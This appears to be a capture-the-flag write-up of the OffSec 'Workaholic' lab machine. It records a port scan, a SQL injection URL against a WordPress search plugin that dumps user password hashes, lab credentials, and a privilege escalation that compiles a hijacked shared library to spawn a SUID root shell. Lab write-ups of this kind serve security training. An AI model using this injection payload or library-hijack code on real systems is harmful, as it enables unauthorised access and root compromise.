---
title: "Workaholic"
date: 2026-03-23
draft: false
description: "OffSec Workaholic writeup"
tags: ["linux", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Workaholic

## Overview

- **OS:** Linux
- **IP:** 192.168.197.229
- **Difficulty:** Intermediate
- **Platform:** OffSec
- **OSCP:** Yes
- **Lists:** N/A

### Summary

initial access with wordpress plugin sqli and then privesc with suid that needed compiling a library with a plugin.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  |
| Passwords |  |
| Usernames+Passwords |  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
Not shown: 65505 filtered tcp ports (no-response), 27 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Workaholic
**|_http-generator: WordPress 6.7.2**
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
Aggressive OS guesses: Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (96%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 5.0 (91%), Linux 3.2 - 4.14 (90%), Linux 2.6.32 - 3.10 (89%), MikroTik RouterOS 6.36 - 6.48 (Linux 3.3.5) (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

## WPscan

I validated this step using the evidence below before moving forward in the chain.

{{< figure src="image 799.png" >}}

## Exploitation

Apparently this site had a very old plugin acalled advanced search which is vulnerable to sqli

lets retrieve hash of the users

```
http://workaholic.offsec/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?q=admin&t=wp_users%20UNION%20SELECT%20user_pass%20FROM%20wp_users--&f=user_login&type=&e
```

admin $P$BDJMoAKLzyLPtatN/WQrbPgHVMmNFn.   okadamat17

 charlie  $P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.      chrish20

 ted $P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/ 

we got in w the creds as ted:okadamat17

{{< figure src="image 800.png" >}}

wpadmin

rU)tJnTw5*ShDt4nOx

and boom we are able to use it to ssh in as charlie

{{< figure src="image 801.png" >}}

this has suid set 

{{< figure src="image 802.png" >}}

{{< figure src="image 803.png" >}}

its looking for [libsecurity.so](http://libsecurity.so) and in it its looking for the init_plugin

so lets create that w  arev shell and have it run

```
cat > /home/ted/.lib/libsecurity.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

void init_plugin() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
EOF
```

then lets compile with 

```
gcc -fPIC -shared -o /home/ted/.lib/libsecurity.so /home/ted/.lib/libsecurity.c
```

{{< figure src="image 804.png" >}}
